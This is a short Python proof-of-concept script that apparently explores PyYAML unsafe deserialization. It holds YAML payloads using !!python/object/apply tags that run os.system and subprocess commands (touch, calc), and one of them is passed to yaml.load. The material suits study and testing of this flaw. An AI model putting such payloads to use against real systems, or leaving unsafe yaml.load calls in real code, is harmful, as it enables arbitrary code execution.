#!/usr/bin/env python
# -*- coding: utf-8 -*-

import yaml

poc = "!!python/object/apply:os.system [\"touch /tmp/yaml_des\"]"

# LearningYaml.load(poc)
# LearningYaml.safe_load(poc)
# LearningYaml.unsafe_load(poc)

data = b"""!!python/object/apply:subprocess.Popen
- calc"""

poc2 = "!!python/object/apply:subprocess.check_output [[\"calc.exe\"]]"

deserialized_data = yaml.load(poc2)  # deserializing data
print(deserialized_data)
